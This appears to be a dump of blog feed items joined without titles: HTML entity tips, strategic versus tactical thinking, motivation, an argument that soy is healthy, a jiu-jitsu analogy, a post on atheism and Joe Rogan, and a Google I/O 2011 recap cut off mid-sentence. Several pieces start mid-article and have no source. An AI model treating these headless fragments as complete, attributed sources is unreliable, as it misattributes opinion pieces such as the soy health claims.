      "content" : "<p>It has been over a couple of years since I posted my <a href=\"http://line25.com/articles/10-html-tag-crimes-you-really-shouldnt-commit\">HTML tag</a> and <a href=\"http://line25.com/articles/10-usability-crimes-you-really-shouldnt-commit\">usability crimes</a> posts, both of which are amongst the most popular articles here on Line25. There’s something about this title people just can’t resist! Let’s take a look at ten crimes you may be committing in your HTML content. These won’t exactly land you a life sentence, but I bet almost every one of us will be guilty of at least one of these petty crimes. </p>\n<p><span></span></p>\n<h3>Crime 1: Not converting your ampersands</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/1.jpg\" alt=\"Ampersand\"></p>\n<p>One of the most common HTML validation errors I see when checking the code behind Sites of the Week features are unconverted ampersand characters. It’s easy to simply paste in your content from an external document and forget to transform your <code>&amp;</code> characters into the correct <code>&amp;amp;</code> HTML entity.</p>\n<h3>Crime 2: Making your own ellipsis</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/2.jpg\" alt=\"Ellipsis\"></p>\n<p>Did you know those three dots used to indicate a pause in a sentence are called an ‘ellipsis’? Rather than typing three periods or full stops it actually has it’s own glyph as the <code>&amp;hellip;</code> HTML entity. The spacing between the dots in the entity is much tighter than the standard spacing between three full stops or periods. Remember, there’s only ever three dots (four in certain situations), don’t be the person who extends their ellipsis to 6+ dots……….. </p>\n<h3>Crime 3: Incorrect use of the em dash</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/3.jpg\" alt=\"Em dash\"></p>\n<p>I’m definitely guilty of this one myself. I can never remember when to use Em dashes over En dashes, and what’s worse I tend to stick in a plain old hyphen which makes the crime even more serious! The Em dash or <code>&amp;mdash;</code> in HTML entity format is typically used to separate a break of thought in a sentence.</p>\n<h3>Crime 4: Incorrect use of the en dash</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/4.jpg\" alt=\"En dash\"></p>\n<p>Similar to the Em dash crime, the En dash is another form of dash often misused in our body copy. The En dash or <code>&amp;ndash;</code> in its HTML entity form is used to express a range of values or a distance, so essentially the En dash is placed where you would say the word “to” when talking about age ranges or a journey between two places.</p>\n<h3>Crime 5: DIY Copyright symbol</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/5.jpg\" alt=\"Copyright symbol\"></p>\n<p>I’m sure we’re all familiar with the international copyright symbol—the letter C with a circle around it <code>©</code>. Rather than use this standardised symbol, sometimes people decide to construct their own with brackets, <code>(c)</code>, probably because they couldn’t figure out the keyboard combination to insert the symbol in Word. Thankfully it’s much easier for web designers with the easy to remember HTML entity of <code>&amp;copy;</code>.</p>\n<h3>Crime 6: DIY Trademark symbols</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/6.jpg\" alt=\"Trademark symbol\"></p>\n<p>Similar to the copyright symbol, the trademark symbol <code>™</code> has its own HTML entity glyph as <code>&amp;trade;</code>, so there’s no need to design your own from styled <code>&lt;sup&gt;</code> or <code>&lt;span&gt;</code> tags.</p>\n<h3>Crime 7: Plain text fractions</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/7.jpg\" alt=\"Half fraction\"></p>\n<p>Another common addition to every day body text is the use of fractions to show quarter, half or three quarters in their shorthand, numeric format. I’m sure we’re all guilty of writing 1/4, 1/2 or 3/4 as opposed to their HTML entity counterparts of <code>¼</code>, <code>½</code> &amp; <code>¾</code> as <code>&amp;frac14;</code>, <code>&amp;frac12;</code> &amp; <code>&amp;frac34;</code>.</p>\n<h3>Crime 8: Plain text mathematics symbols</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/8.jpg\" alt=\"Divide symbol\"></p>\n<p>Common mathematical symbols such as add, minus, multiply and divide are also misused in general body text. The add and minus symbols not so much, as they’re easily created with their designated keyboard buttons, but multiply and divide are usually seen as the letter <code>x</code>, an asterisk <code>*</code>, or a slash <code>/</code>. <code>×</code> and <code>÷</code> symbols can be easily created with the HTML entities of <code>&amp;times;</code> and <code>&amp;divide;</code>.</p>\n<h3>Crime 9: Supersized degree symbols</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/9.jpg\" alt=\"Degree symbol\"></p>\n<p>The degree symbol is not the most common glyph used in every day body text, but it’s necessary when talking about temperature, angles or longitude/latitude map locations. We often see the degree format in disguise as a plain old letter <code>o</code>, but it can be created correctly using the <code>&amp;deg;</code> HTML entity like so: 45°.</p>\n<h3>Crime 10: Somewhat straight curly quotes</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2011/html-entities/10.jpg\" alt=\"Curly quotes\"></p>\n<p>A massive pet peeve for many, the incorrect use of quotes in textual content is one of the most common typographic errors on earth. The standard quotation marks entered with our keyboards are the numerical type which indicate a unit of measurement such as 5′10″. When quoting people, curly quotes should be used with the <code>&amp;ldquo;</code> and <code>&amp;rdquo;</code> entities: “Now I, Skeletor, am master of the universe”, or for single quotes the <code>&amp;lsquo;</code> and <code>&amp;rsquo;</code> entities.</p>\n<h3>HTML Entity names vs entity number</h3>\n<p>Every HTML entity can be written as its name value <code>&amp;copy;</code> or as its numerical value <code>&amp;#169;</code>. The main advantage of using an entity name is the character is easily recognisable as the name often relates to the actual entity in question (copy = copyright). However entity names aren’t <em>as</em> well supported as entity numbers, which have good all round support.</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/Line25?a=lErT924yMJw:3T-BsKPw4DM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=lErT924yMJw:3T-BsKPw4DM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=lErT924yMJw:3T-BsKPw4DM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Line25?i=lErT924yMJw:3T-BsKPw4DM:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=lErT924yMJw:3T-BsKPw4DM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=lErT924yMJw:3T-BsKPw4DM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Line25?i=lErT924yMJw:3T-BsKPw4DM:gIN9vFwOqvQ\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Line25/~4/lErT924yMJw\" height=\"1\" width=\"1\">"

In a nutshell, Tactical thinking is “doing things right,” while Strategic thinking is “doing the right things.” Strategic thinking is typically leadership: creating the vision. Whereas Tactical thinking is management: implementing the vision.</p><p>When it comes to strategic vs. tactical planning, it’s easy to fall into either/or thinking—that is, either strategic thinking is better, or tactical thinking is better. This is especially true when you realize which type of thinker you are. We tend to believe that our type of thinking must be superior. But regardless of whether you are a strategic or a tactical thinker, you must come to realize that both types are critical to success; and you must learn to appreciate your business partner and/or your employees’ way of thinking and value the contribution they can make towards accomplishing your goals.</p><p>So when I use the term strategic vs. tactical thinking, it’s not to imply that they are at odds with one another; rather it’s to contrast the difference between the two, so you can begin to distinguish and appreciate those differences. It’s also critical to recognize when you are not applying both types of thinking to the situation.</p><p>Difficulties arise when one or the other, rather than both, is used to tackle a problem. Strategic thinkers tend to analyze the situation but often fail to take action. “Paralysis by analysis” is their downfall. Tactical thinkers are all about “doing something,” but they often don’t think before springing into action; so oftentimes, their action is ineffective, and perhaps unnecessary. If only they’d taken the time to step back and analyze the situation beforehand.</p><p>Think of strategic and tactical thinking like the strings of a violin. In order for the instrument to create beautiful music, each string must have tension applied to both ends. If tension is released from either side, then the music it was intended to create cannot be produced.</p><p>The apparent tension between strategic and tactical thinking is seen in the statement, “Doing Things Right vs. Doing the Right Things.” Tactical thinkers tend to focus on “doing things right,” and strategic thinkers are concerned with “doing the right things.” But let’s consider that statement for just a moment. If you do something “right,” but it’s the wrong thing to do, your efforts will be futile. Conversely, if you do the “right thing,” but you do it wrong, you’ll also fail miserably.</p><blockquote><p>“Strategy without tactics is the slowest route to victory. Tactics without strategy is the noise before the defeat” – <em>Sun Tzu</em></p></blockquote><p>Let me give you a couple of examples.</p><h2>Doing the Right Thing, but Doing it Wrong</h2><p>When my partners and I began our web development business, one of the “things” we did to find clients was cold-calling. Today, I run a telemarketing department, so I know something about it. But eight years ago, I was completely ignorant on the topic. Without a script or much of plan, we opened the phone book and started calling.</p><p>As you can imagine, we were less than successful. We landed two very small jobs (one of which we ended up refunding the money), so we decided that cold calling wasn’t the way to find clients in our market. It wasn’t until a few years later that I met some colleagues who were having great success with cold calling. One even told me that it was the primary way he gained new business. Our failure caused us to conclude that we were “doing the wrong thing,” when in reality, we were “doing the thing wrong.”</p><h2>Doing the Wrong Thing, but Doing it Right</h2><p>A few years later, I met a business woman whose product was coffee gift baskets. Previous to this, she’d been a freelance computer programmer and IT consultant. As most of you know, the primary way a person in that field gets business is through networking: belonging to groups such as chamber of commerce, establishing relationships with people that could become clients or who know others who could become clients. Much of this type of work is gained by “word of mouth.” Jackie knew this and was good at it. And since that was all she knew, she was using it for her coffee gift basket business.</p><p>The problem was that, unlike computer programming, where she only needed maybe one or two new clients every few months to make a living, Jackie needed to sell several dozen baskets each week to make a profit. What Jackie needed was a website and a retail outlet to expose her product to the public. Networking meetings were getting her one or two sales, at best, a month. If Jackie had been a different type of person, she might have concluded that she was “doing the thing wrong” and tried harder—more networking meetings, talk to more people, and so on. Fortunately, she realized that, although she was “doing the thing right,” it was “the wrong thing” to do for her new business.</p><p>So let’s get away from either/or thinking, and engage in both/and thinking: both strategic thinking and tactical thinking are critical for success.</p><div style=\"text-align:center;padding-bottom:50px\"><div style=\"float:left;padding-left:30px\">  </div><div style=\"float:right;padding-right:30px\">  </div></div><div style=\"clear:both\"></div><img src=\"http://feeds.feedburner.com/~r/SitepointFeed/~4/8LyXA2UULP8\" height=\"1\" width=\"1\">"

I instinctually know whatever I’m working on is not actually worth it — that all this effort I’m about to put in is not going to pay off. Or maybe I’m just not good at what I’m trying to do. Either way, it feels like a waste of time.</p>\n\n\n\t<p>Plus, I find it hard to have a wide array of things that I’m interested in at the same time. I usually pick one thing and I get really interested in solving that. Any other task that doesn’t fall under that banner has a hard time capturing my imagination and getting done. I just put that on the back burner until whatever I’m naturally interested in gets completed or my motivation runs out.</p>\n\n\n\t<p>When you have a natural interest in something, your productivity goes through the roof. Even though whatever I’m naturally interested in might not, from an objective point of view, be the most important thing to work on at that time, it is the most important thing to work on because of the productivity gains I get out of just being super fired-up about it. I have to get that out of my system. And I wind up doing things really quickly.</p>\n\n\n\t<p>When you’re not working on something you’re inspired by, your efficiency is so much lower. You find more moments in the day to let yourself be distracted by email or reading on the Web or something else. That’s usually the key smell I detect when I’m working on something I don’t really want to be working on: I check email much more frequently and I engage in chats about things that aren’t related to what I should be working on.</p>\n\n\n\t<p>On the flip side, when I’m working on something I’m really fired up about, I couldn’t care less about new posts on Twitter or whatever. Instead, I get whatever I’m working on done right away.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=b1UwIsGIbNc:ksfVybvSecM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=b1UwIsGIbNc:ksfVybvSecM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/b1UwIsGIbNc\" height=\"1\" width=\"1\">"

      "content" : "<h6>Post written by <a href=\"http://leobabauta.com\">Leo Babauta</a>.</h6>\n<p>It’s one of those things that has spread on the Internet and unbelievably, has become accepted truth to many people: that soy is unhealthy, even dangerous.</p>\n<p>I mention (to otherwise smart and informed people) that I drink soymilk sometimes, and a look of pity comes over their faces. ‘This guy doesn’t know the dangers of soy, and might get cancer, or worse … man boobs,’ they’re thinking.</p>\n<p>Just about every fitness expert I read — people I respect and trust — says that soy is bad for you, from <a href=\"http://fourhourbody.com\">Tim Ferriss</a> to the primal/paleo folk. I absolutely respect most of these guys and otherwise think their work on fitness-related matters is great. And yet, when I look for their sources on soy, often they don’t exist, and when they do, I can always trace them back to one place.</p>\n<p>The <a href=\"http://www.sourcewatch.org/index.php?title=Weston_A._Price_Foundation\">Weston A. Price Foundation</a>.</p>\n<p>Seriously. I’ve never seen anyone cite a single peer-reviewed study that shows that soy is unhealthy. The only sources are the Weston A. Price Foundation, or other articles that use the Weston A. Price Foundation as a source (<a href=\"http://www.guardian.co.uk/commentisfree/2010/jul/01/anti-soya-brigade-ignore-scaremongering/print\">read more</a>).</p>\n<p>Here’s the thing: the Weston A. Price Foundation (WAPF) have been on a vendetta against soy (and on a campaign for meat and raw milk) for a couple decades now, and they have no solid evidence to back up their vendetta. They have lots of quasi-scientific evidence, lots of reasonable-sounding arguments, but if you look for solid proof, you won’t find any. They are not scientists, and have conducted no actual peer-reviewed studies of their own (that I know about).</p>\n<p>It’s amazing how many people have been influenced by WAPF’s wacky writings — whenever you read articles not only against soy, but about the myths of cholesterol or saturated fat (WAPF <a href=\"http://www.diseaseproof.com/archives/diet-myths-the-misinformation-of-barry-groves-and-weston-price.html\">dangerously advocates</a> a diet high in saturated fat), or about raw milk or meat, or about coconut oil and butter … it is based on the work of WAPF. WAPF has even influenced the writings of major writers as <a href=\"http://health.groups.yahoo.com/group/AV-Skeptics/message/4342\">Gary</a> <a href=\"http://www.atkinsexposed.org/atkins/105/Center_for_Science_in_the_Public_Interest.htm\">Taubes</a> and <a href=\"http://michaelpollan.com/interviews/michael-pollan-debunks-food-myths/\">Michael Pollan</a>.</p>\n<p>I’m not going to tell you to fill your diet with soy. I eat it moderately, like anything else, but am not afraid of it. What I am going to do is clear up some myths, and challenge those who disagree with me to show actual peer-reviewed studies (not articles by WAPF or that cite WAPF as their source).<br>\n<span></span></p>\n<h3>Who are the Weston A. Price Foundation?</h3>\n<p>I won’t do an entire treatise on WAPF, as others have done it better:</p>\n<ul>\n<li><a href=\"http://www.diseaseproof.com/archives/debunking-diet-myths-weston-a-price-foundation-stupid-traditions.html\">Weston A. Price Foundation, Stupid Traditions</a></li>\n<li><a href=\"http://unreasonable.org/node/1642?page=2\">Weston A. Price Foundation: Shills &amp; Quacks</a></li>\n<li><a href=\"http://www.vegsource.com/news/2010/07/the-truth-about-the-weston-price-foundation.html\">The Truth About Weston A. Price Foundation</a></li>\n<li><a href=\"http://www.vegsource.com/news/2009/11/reflections-on-the-weston-a-price-foundation.html\">Reflections on the Weston A. Price Foundation</a></li>\n<li><a href=\"http://sci.tech-archive.net/Archive/sci.med.nutrition/2006-11/msg00287.html\">Questioning Weston A. Price Foundation</a></li>\n</ul>\n<p>I’d encourage you to read these and consider the arguments and evidence, not the sources. While some of these articles are from vegetarians, that doesn’t negate the arguments — they just seem more motivated to do the research on WAPF than most people are.</p>\n<p>But basically the WAPF is a fringe group that advocates some weird health claims about meat, raw milk, butter … but who came along just at the time when the meat and dairy industry was worried about soy being promoted as a healthy alternative. WAPF claims they don’t take money from agribusiness or the food processing industry, which is both true and admirable … but they do receive funding from sponsors and members — a large percentage of whom are dairy and meat farmers.</p>\n<p>Anyway, the problem is not where their funding comes from — it’s their science. Sally Fallon (WAPF founder) and her co-author Mary Enig, WAPF board member Dr. Joe Mercola, Stephen Byrnes, and other WAPF authors use quack science to promote their agenda, and yet most people can’t distinguish between good and bad science. When they make claims about Eskimo diets being entirely meat and fat based, that sounds reasonable to most people, who don’t realize that you can’t just observe a people and make conclusions that are then generalized to other populations, or that the Inuit Greenlanders had the shortest life expectancy of any indigenous North Americans and high cancer rates (<a href=\"http://www.diseaseproof.com/archives/diet-myths-the-misinformation-of-barry-groves-and-weston-price.html\">read more</a>). Most people don’t understand how empirical science is done, and so don’t understand why criticism by the WAPF’s Chris Masterjohn of The China Study is a <a href=\"http://www.vegsource.com/articles2/campbell_china_response.htm\">misinterpretation of the evidence</a>.</p>\n<p>Don’t take my word for it. Read the links above, become informed, weigh the evidence. Ask for the results of actual peer-reviewed studies, instead of relying on scientific-sounding arguments.</p>\n<h3>Does soy contain dangerous estrogens?</h3>\n<p>One of the most-repeated of WAPF’s myths about soy is that it contains dangerous estrogens that will cause cancer, man boobs, and a host of other health problems. So I thought it would be good to clear this up.</p>\n<p>There is no evidence that eating soy causes any of the problems caused by raised levels of estrogen (a hormone that’s <a href=\"http://en.wikipedia.org/wiki/Estrogen\">already naturally</a> in our bodies).</p>\n<p>The confusion that WAPF plays on is that soy contains a natural, non-steroidal compound called phytoestrogens — but actually many other plants and plant foods <a href=\"http://www.dietaryfiberfood.com/phytoestrogen.php\">contain phytoestrogens too</a>, including flaxseeds, sesame seeds, hummus, garlic, peanuts, and more.</p>\n<p>Phytoestrogens are not estrogens, and though they might be similar, they have completely different effects on the human body. They do not affect the sperm count or concentration in men, nor do they affect the size of your testicles or volume of ejaculate (<a href=\"http://www.clinsci.org/cs/100/0613/cs1000613.htm\">more</a>). Note: A small-scale, preliminary study by Harvard researcher Jorge Chavarro found that processed soy <em>might</em> have some effect on sperm counts of obese men, but even Chavarro cautioned that nothing conclusive has been found (<a href=\"http://www.diseaseproof.com/archives/research-does-soy-really-lower-sperm-count.html\">more</a>).</p>\n<p>Phytoestrogens don’t cause breast cancer in women (<a href=\"http://www.thelancet.com/journals/lancet/article/PIIS0140-6736(97)01339-1/fulltext\">more</a>).</p>\n<p>Soy infant formula, while not nearly as good as human breast milk, is safe (<a href=\"http://jn.nutrition.org/content/134/5/1220S.long\">more</a> and <a href=\"http://cot.food.gov.uk/cotreports/cotwgreports/phytoestrogensandhealthcot\">more</a>).</p>\n<p>As you can see, I’ve linked to a few peer-reviewed studies that look at actual evidence, not pseudo-scientific arguments. There are many more that are easily found via Google. If you read or hear people making claims about soy and estrogen, ask for the sources, and ask that they be peer-reviewed studies.</p>\n<h3>Has soy been shown to be unhealthy?</h3>\n<p>In a word: no.</p>\n<p>While I won’t claim that soy is a magic bullet for getting healthy, it also doesn’t have the dangers that WAPF and others claim it does. In fact, there is no evidence for any of those claims. I won’t get into all the claims, but just touch on a couple of the prevalent:</p>\n<p><strong>1. FALSE: Soy inhibits the digestion of nutrients (anti-nutrients)</strong>. It’s true that soy, like many plants, have anti-nutrients — but when you cook, ferment, soak, roast, or sprout these plants, you do away with the anti-nutrients. From Dr. Andrew Weil: “There is no scientific data suggesting that soy consumption leads to mineral deficiency in humans.” (<a href=\"http://www.drweil.com/drw/u/id/QAA326575\">more</a>) Fallon, Enig, and the other WAPF writers have failed to provide any evidence at all for this claim (<a href=\"http://www.johnrobbins.info/blog/what-about-soy/\">more</a>).</p>\n<p><strong>2. FALSE: Soy increases the risk of cancer</strong>. In fact, the evidence shows just the opposite. The <a href=\"http://www.hsph.harvard.edu/hpfs/\">Health Professionals Follow-up Study</a> found a 70% reduction in prostate cancer for men who consume soy milk daily. The American Institute for Cancer Research, in collaboration with the World Cancer Research Fund, issued <a href=\"http://www.dietandcancerreport.org/\">a major report in 1997</a> that analyzed more than 4,500 research studies, with more than 120 contributors and peer reviewers, including those from the World Health Organization, the Food and Agriculture Organization of the United Nations, the International Agency on Research in Cancer, and the U.S. National Cancer Institute. The report said that “Phytoestrogens are found in high concentrations in soya beans, and have been shown in vitro to exhibit a plethora of different anti-cancer effects, including inhibiting proliferation.” The report found some evidence that soy protects against stomach and prostate cancers. In 2000, Riva Bitrum, the President of Research for the American Institute for Cancer Research, said that “Studies showing consistently that just one serving a day of soyfoods contributes to a reduction in cancer risk are encouraging. Consuming one serving of soyfoods is a step most individuals would not find too difficult to take.” For healthy women, according to the American Institute for Cancer Research, “even two or three servings a day of soyfoods should be fine as one part of a mostly plant-based diet.” (<a href=\"http://www.johnrobbins.info/blog/what-about-soy/\">more</a>)</p>\n<p><strong>3. FALSE: Soy causes (insert scare claim here: Alzheimer’s, birth defects, etc.)</strong>. There isn’t any evidence for any of the scare claims that originate from WAPF. I’m not going to argue them all, but I urge you to read these articles from <a href=\"http://www.johnrobbins.info/blog/what-about-soy/\">John Robbins</a>, <a href=\"http://www.huffingtonpost.com/neal-barnard-md/settling-the-soy-controve_b_453966.html\">Dr. Neil Barnard</a>, <a href=\"http://eatkind.net/wholesoystory.htm\">Syd Baumel</a>, and <a href=\"http://www.vegsource.com/news/2010/07/the-truth-about-the-weston-price-foundation.html\">Dr. Joel Fuhrman</a> — they contain many more sources than I could list here, and they’re based on actual evidence. </p>\n<p><strong>4. Legitimate concerns</strong>. Like most foods (meat, milk, peanuts, nuts, berries, chocolate, etc.), there are people with certain conditions that should be more careful. None of the legitimate concerns about soy are causes for alarm. Some people are allergic to soy. There is conflicting evidence about soy’s effect on women who already have breast cancer — some evidence suggests that it might be beneficial, but it’s not conclusive. If you already have a thyroid disorder, <em>excess</em> soy consumption (more than a couple times a day) could affect thyroid function (<a href=\"http://www.drweil.com/drw/u/id/QAA326575\">more</a>). Genetically modified soybeans (common in the U.S. because of Monsanto) are not as healthy as organic soybeans — try to eat organic more than not. Soy formula for infants is less healthy than human breastmilk (as is milk-based formula) — though decades of people brought up on soy formula as babies have shown no ill effects. Still, human breastmilk is much better. Again, none of these legitimate concerns is anything to be scared about — most people can eat soy a few times a day with no effects, according to the overwhelming mass of evidence, and even those who might have a concern can eat some amounts of soy with no problems.</p>\n<h3>So should I eat soy?</h3>\n<p>I honestly don’t care if you do or not. My general recommendation is to eat mostly real, whole foods — veggies, fruits, nuts, beans, seeds, a moderate amount of whole grains. I don’t eat meat or dairy for ethical reasons, but if you do eat meat, you should limit your intake of red meat (<a href=\"http://www.washingtonpost.com/wp-dyn/content/article/2006/11/13/AR2006111300824.html\">many</a> <a href=\"http://www.ncbi.nlm.nih.gov/pmc/articles/PMC2803089/?tool=pmcentrez\">studies</a> <a href=\"http://www.sciencedaily.com/releases/2008/11/081113181428.htm\">have</a> <a href=\"http://www.npr.org/templates/story/story.php?storyId=102306407\">shown</a> the <a href=\"http://en.wikipedia.org/wiki/Red_meat#Health_risks\">health risks of red meat</a>).</p>\n<p>But soy has been eaten in moderation for centuries, and as I said above, has not been shown to be unhealthy. It can be included in a healthy diet — tofu, some soy milk, whole soy beans, tempeh can all be good for you if you mix them in with the other real foods I mentioned above. Soymilk is basically whole soy beans soaked in water and squeezed to produce a milky liquid, and tempeh is actual soybeans fermented.</p>\n<p>I would be cautious about overly processed soy foods — processed soy protein — just as I would any other processed foods. Meaning, don’t be afraid of them, but don’t make them a major part of your diet. Eat real foods instead. And organic is healthier.</p>\n<p>As a last note to doubters: I welcome your doubt — it’s important not to take my word as final. But instead of rebutting me with scientific-sounding arguments, show me the peer-reviewed studies. And not just one study, as no one study will be proof of anything — show me the mass of research that’s been done. When you look at the entirety of the research that has been done on soy, the evidence is overwhelmingly clear. I’d love to see someone show otherwise.<br>\n—<br>\n<a href=\"http://twitter.com/share\">Tweet</a></p>"

      "direction" : "ltr",
      "content" : "<p>Back in 2006, <a href=\"http://en.wikipedia.org/wiki/John_Will\">John Will</a> was in Perth teaching a jiu-jitsu seminar at <a href=\"http://mixedmartialarts.com.au/\">The Academy</a>. Whilst I enjoy John’s BJJ teaching (he’s Australia’s most prolific BJJ instructor), I find his relaxed and informal conversations to be the real highlight of his visits. He tells incredibly interesting stories, and over the years he has developed a keen insight into  how people learn and develop. I think that this is what makes him excel as an individual within the BJJ community, more than any of his on-the-mat accomplishments.</p>\n<p>It was during this seminar that he presented an idea which has stuck with me, and is largely responsible for forming my view of progression with respect to jiu-jitsu. <a href=\"http://lambie.org/2006/05/29/grading-john-will-seminar/\">I wrote about it then</a>, but it has further solidified in my mind over the last 5 years.</p>\n<p>Specifically, he highlighted that the difference between a beginner and an expert (a white belt versus a black belt) is their ability to acknowledge and respond to situations faster. His example revolved around a person wading into quick sand. The white belt would be up to their neck before they realised that it was dangerous, and from here it’s much harder to escape. In contrast, a black belt would dip their toe into the quick sand and immediately detect it as being unsafe. As such, their escape is much easier (or rather, is comprised of less steps).</p>\n<p>I think this analogy really works well with jiu-jitsu, but I’ve used it personally to represent other situations in the past 5 years to great effect - it describes software development too. I think the visual images that are conjured are very easy to absorb and relate to.</p>\n<p>This weekend John added what I consider to be the reverse analogy to his initial point, and whilst it’s not a new concept, it seemed to really click with me.</p>\n<p>The idea is that nobody wakes up 40kgs overweight; it’s a gradual progression which results in you one day looking in the mirror and asking yourself “how the hell did I let this happen?” (I think this is another way of phrasing the “quick sand” analogy).</p>\n<p>When you make the conscious decision to tackle your problem, it can seem insurmountable. It’s impossible to lose 40kg in a day, no matter how hard you work out (and presuming amputation is out of the question). However, it is possible to go for a run, watch what you eat and lose a kilogram by the time you go to bed. Wash, rinse, repeat and you’ll find yourself chipping away at the problem.</p>\n<p>Another way of thinking about it is within the realm of finance – you can’t get out of $100,000 worth of debt in one day (unless you rob a bank), but you can save $200 fairly easily. Now the problem is only $99,800 and you’re making progress.</p>\n<p>John labeled this as being a 5% improvement (don’t do the maths – it’s just an approximation ;)</p>\n<p>When you’re up to your neck in quick sand, imagining yourself clear and free might be impossible, but imagining yourself in a position that’s a 5% improvement is well within your reach. So make that one little adjustment, and then reassess the situation to determine what the next 5% adjustment is.</p>\n<p>I think the power in this is even more than John highlighted, because these adjustments will potentially reveal other pathways or opportunities that you didn’t see from the start.</p>\n<p>Consider this: as you’re backing out of the quick sand you make your 5% adjustments and then bump into a tree root, hidden below the surface. Now you have a strong escape option that you simply couldn’t have foreseen when you were up to your eyes in trouble. It was the small escapes; the small adjustments that led to this saving option, but you’d have never found it unless you started that 5% journey.</p>\n<p>Again, whilst I don’t think any of these concepts are necessarily revolutionary, they had a revolutionary impact on me back in 2006, and then again yesterday. Considering my hard work and effort was acknowledged with the awarding of a purple belt yesterday, it felt like that story – of getting into trouble, but then getting out again – was complete.</p>\n<p>It felt like John gave me the other bookend.</p>"

      "content" : "<p><em>This post has been in draft format since October 2010. WIth the recent Rapture discussion, I thought it might be worthwhile dusting it off and finishing it.</em></p>\n<p>On the weekend I was asked about my religious views, with respect to how I identified myself through Facebook. Whilst I think the intention was to push my buttons and spark controversy, it’s instead had a different impact on me.</p>\n<p>Until a few minutes ago I considered myself, according to my entry on Facebook, as being “strongly atheist.” At the time I set this, I certainly felt as though my stand was being questioned on a frequent basis (I was marrying Magdalena and her family identifies as Catholic), and the position of “atheist” didn’t summarise my feelings strongly enough. </p>\n<p>I’m not someone who is uncertain, or simply hasn’t been exposed to the right information or a strong enough opinion to sway me. On the contrary, I’m quite certain of what I believe. Back when you could click your religious affiliation link on Facebook and find others who were similarly aligned, there was only a few dozen of us in the “strongly atheist” camp. I wasn’t in a majority; not by a long shot. But I also wasn’t alone.</p>\n<p>So what has changed in the last few years? I think there’s been two major influences on me.</p>\n<p>Firstly, my general day-to-day life has exposed me to more people with a greater range in religious associations. Many of the people I consider the dearest consider themselves Christian, or perhaps “strongly Christian.” These people love me for who I am (cliched, I know) and what I believe in, and funnily enough seem to care less about questioning my lack of faith than you might expect. </p>\n<p>Secondly, I listen to the Joe Rogan Podcast quite a lot. Through this I’ve been exposed to an even greater variety of ideas and takes on religion, spirituality, and more often that not, their links to hallucinogenic drugs. I find the podcast format very interesting, in that I feel like I almost know Joe, Redban, Joey Diaz and the rest of the Death Squad crew personally. I feel like I know them as deeply as I know people I consider my friends, though the closest interaction I’ve ever had was seeing Joe from 50m, at work at the UFC in January. That’s a weird position to be in, when you’re in Perth, Western Australia, and they’re in Los Angeles, USA, and have no idea you exist.</p>\n<p>However, I feel like I’m involved in a conversation with these people, whereby I’m not actually talking, but instead just get to listen. </p>\n<blockquote><p>I’m eavesdropping on the most captivating, relevant and applicable conversation imaginable.</p></blockquote>\n<p>Many times I feel like the podcast has been tailored just for me, as the topics discussed intersect my interests perfectly. The fact that both sides of any argument or idea are always discussed (that’s one of Joe’s awesome personal traits) means that often my perspective comes up in the discussion anyway. The fact is I respect the hell out of these guys, and admire their honesty and intent.</p>\n<p>So yeah, for the last 6 months my religion-as-defined-on-Facebook has been “Joe Rogan” and in the same way as Christians have found a role model in Jesus, I feel like I have a role model in Joe. The main differences I see is that Joe talks one way to me, instead of me talking one way to Him… </p>\n<p>And I can prove to you that Joe exists ;)</p>"

      "content" : "<p>I just got back to my hotel after the merriments that were the Google I/O  after party in the Thirsty Bear Brewery and thought it is time for some reflection on the event.</p>\n\n\t<p><img src=\"https://img.skitch.com/20110513-fpenpu4qpt2iq9ww1353xtp8h8.jpg\" alt=\"Google IO 2011\" width=\"615\"></p>\n\n\t<p><h2>Overall impression</h2></p>\n\n\t<p>Google IO was a very good conference, I heard a lot of interesting news, met people I hadn’t seen in quite a while and got to know a lot of others. It is a huge event and there was no lack of things to keep you occupied. Showcase booths of software but also an amazing amount or Robots and other hardware demos, vehicles to play with and lots of breakout space made it a great place to learn, look and talk to each other and people in Google. The HR presence was very subtle and there was no brutal hiring drive you get at other events of this nature.</p>\n\n\t<p>Catering was good, there was always coffee and drinks but the queues at lunch were very long indeed and I skipped a few meals to spend more time with folk instead.</p>\n\n\t<p>The main stage visuals were top-notch and the quality of the A/V equipment amazing. Talks were recorded, streamed and transcribed live. Great stuff.</p>\n\n\t<p>The wireless, on the other hand, was abysmal. This is partly the fault of the attendees who set up their own hotspots (despite the badge telling you explicitly not to do so) and thus saturating the wireless range. That there was no dedicated speaker lounge or network was an oversight I’d love to see rectified. I do enjoy tweeting and blogging about an event but couldn’t do so.</p>\n\n\t<p>The party on the first day had real time animations synced to the 